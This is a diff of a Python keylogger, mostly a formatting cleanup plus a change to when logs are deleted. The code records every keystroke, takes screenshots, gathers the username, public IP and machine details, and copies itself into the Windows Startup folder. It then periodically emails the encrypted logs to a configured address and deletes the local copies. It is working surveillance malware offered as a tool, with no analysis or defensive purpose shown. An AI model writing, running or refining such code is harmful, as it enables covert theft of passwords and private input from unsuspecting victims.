@@ -20,42 +20,41 @@ class Keylogger():
 
     def __init__(self):
 
-        #Fernet Key
+        # Fernet Key
         self.FernetKey = "3F5_MIT38NjguwKLSztfCdeoOYPOMi3NKK0rEGCrlSg="
 
-        #Log settings
-        self.Path = r"C:\Users\Public\Documents\Log" # Path to locally stored log files
-        self.LogFile = "log.txt"                     # Keylogs filename
-        self.SystemInfo = "systeminfo.txt"           # SystemInfo filename
-        self.ScreenFile = "screenlog"                # Screenshot filename
+        # Log settings
+        self.Path = r"C:\Users\Public\Documents\Log"  # Path to locally stored log files
+        self.LogFile = "log.txt"                      # Keylogs filename
+        self.SystemInfo = "systeminfo.txt"            # SystemInfo filename
+        self.ScreenFile = "screenlog"                 # Screenshot filename
 
-        #Email settings
-        self.Email = "example@gmail.com"             # Your Email (Sender)
-        self.Password = "pass"                       # Your Password (Sender)
-        self.ToEmail = self.Email                    # Email (Recipient)
-        self.Subject = "subject example"             # Email Subject
-        self.Body = "body example"                   # Email Body
+        # Email settings
+        self.Email = "example@gmail.com"              # Your Email (Sender)
+        self.Password = "pass"                        # Your Password (Sender)
+        self.ToEmail = self.Email                     # Email (Recipient)
+        self.Subject = "subject example"              # Email Subject
+        self.Body = "body example"                    # Email Body
 
-        #Other settings
-        self.CharForLine = 30                        # Number of keys pressed in a log line
-        self.ScreenKey = Key.enter                   # Screenshot key
-        self.CloseKey = Key.alt_gr                   # Stop script key
+        # Other settings
+        self.CharForLine = 30                         # Number of keys pressed in a log line
+        self.ScreenKey = Key.enter                    # Screenshot key
+        self.CloseKey = Key.alt_gr                    # Stop script key
 
-        #Other Variables                             
-        self.Keys = []                               # DO NOT EDIT THIS
-        self.KeysCount = 0                           # DO NOT EDIT THIS
-        self.ScreenCount = 1                         # DO NOT EDIT THIS
+        # Other Variables
+        self.Keys = []                                # DO NOT EDIT THIS
+        self.KeysCount = 0                            # DO NOT EDIT THIS
+        self.ScreenCount = 1                          # DO NOT EDIT THIS
 
-
-    #SETUP FUNCTIONS
+    # SETUP FUNCTIONS
 
     def startup(self):
         """
         Add the script to Startup Programs
         """
-        ToPath = r"C:\Users\\"+ os.getlogin() +r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
-        
-        if not __file__ in os.listdir(ToPath):
+        ToPath = r"C:\Users\\" + os.getlogin() + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+        if __file__ not in os.listdir(ToPath):
             shutil.copy(__file__, ToPath)
 
     def create_path(self):
@@ -65,9 +64,8 @@ class Keylogger():
         if not os.path.isdir(self.Path):
             os.mkdir(self.Path)
         os.chdir(self.Path)
-            
 
-    #LOGS FUNCTIONS
+    # LOGS FUNCTIONS
 
     def encrypt(self, string):
         """
@@ -80,7 +78,7 @@ class Keylogger():
 
         x = str(encrypted).replace("'", "")
         output = x[1:]
-       
+
         return output
 
     def write_log(self, file, string):
@@ -91,21 +89,18 @@ class Keylogger():
             line = self.encrypt(string)
             logfile.write(line + "\n")
 
-
     def delete_log(self):
         """
         Delete all log files
         """
         for filename in os.listdir(f"{self.Path}"):
-            try: os.remove(filename)
-            except: pass
+            os.remove(filename)
 
-
-    #INFORMATION FUNCTIONS
+    # INFORMATION FUNCTIONS
 
     def get_data(self):
         """
-        Gets username, public IP, machine, version, system and processor 
+        Gets username, public IP, machine, version, system and processor
         from the the computer.
         """
 
@@ -122,7 +117,7 @@ class Keylogger():
         """
         Returns a string with time set in the computer.
         """
-        return "["+ str(datetime.datetime.now()) +"] "
+        return "[" + str(datetime.datetime.now()) + "] "
 
     def get_screenshot(self):
         """
@@ -136,8 +131,7 @@ class Keylogger():
         message = self.get_time() + f"[+] Screenshot: {name}"
         self.write_log(self.LogFile, message)
 
-
-    #EMAIL FUNCTION
+    # EMAIL FUNCTION
 
     def send_logs(self, timer=True):
         """
@@ -155,42 +149,40 @@ class Keylogger():
             server.starttls()
             server.login(self.Email, self.Password)
 
-
             msg = MIMEMultipart()
             msg['From'] = self.Email
             msg['To'] = self.ToEmail
             msg['Subject'] = self.Subject
 
-            msg.attach(MIMEText(self.Body,"plain"))
+            msg.attach(MIMEText(self.Body, "plain"))
 
             for filename in os.listdir(f"{self.Path}"):
 
-                attachment = open(filename,"rb")
-                part = MIMEBase("application","octet-stream")
+                attachment = open(filename, "rb")
+                part = MIMEBase("application", "octet-stream")
                 part.set_payload((attachment).read())
                 encoders.encode_base64(part)
-                part.add_header("Content-Disposition","attachment; filename= " + filename)
+                part.add_header("Content-Disposition", "attachment; filename= " + filename)
                 msg.attach(part)
                 text = msg.as_string()
 
-            server.sendmail(self.Email,self.ToEmail,text)
-            self.delete_log()
+            server.sendmail(self.Email, self.ToEmail, text)
 
         except Exception as e:
             print(e)
             time.sleep(60)
-            self.send_logs()  
+            self.send_logs()
         finally:
+            self.delete_log()
             server.quit()
 
-
-    #KEYLOGGING FUNCTIONS
+    # KEYLOGGING FUNCTIONS
 
     def on_press(self, key_pressed):
         """
-        Record key and when it was pressed and send them to write_log function 
+        Record key and when it was pressed and send them to write_log function
         """
-        
+
         self.Keys.append(key_pressed)
         self.KeysCount += 1
 
@@ -212,7 +204,6 @@ class Keylogger():
             self.Keys = []
             self.KeysCount = 0
 
-
     def on_release(self, key_pressed):
         """
         Check the key on release.
@@ -223,40 +214,36 @@ class Keylogger():
         if key_pressed == self.CloseKey:
             return False
 
-
-    #MAIN
+    # MAIN
 
     def run(self):
 
-        #Add to startup
+        # Add to startup
         self.startup()
 
-        #Create logs path
+        # Create logs path
         self.create_path()
 
-        #Write systemlog file
+        # Write systemlog file
         for line in self.get_data():
             self.write_log(self.SystemInfo, line)
 
-        #Keylogging
+        # Keylogging
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
-        #Send and destroy latest logs
+        # Send and destroy latest logs
         K.send_logs(False)
 
-        #Killing all Timer Threads
+        # Killing all Timer Threads
         for thread in threading.enumerate():
             if thread != threading.main_thread():
                 thread.cancel()
 
 
-
 if __name__ == "__main__":
-    
-    K = Keylogger()
 
+    K = Keylogger()
     T = threading.Timer(7200, K.send_logs)
     T.start()
-
     K.run()
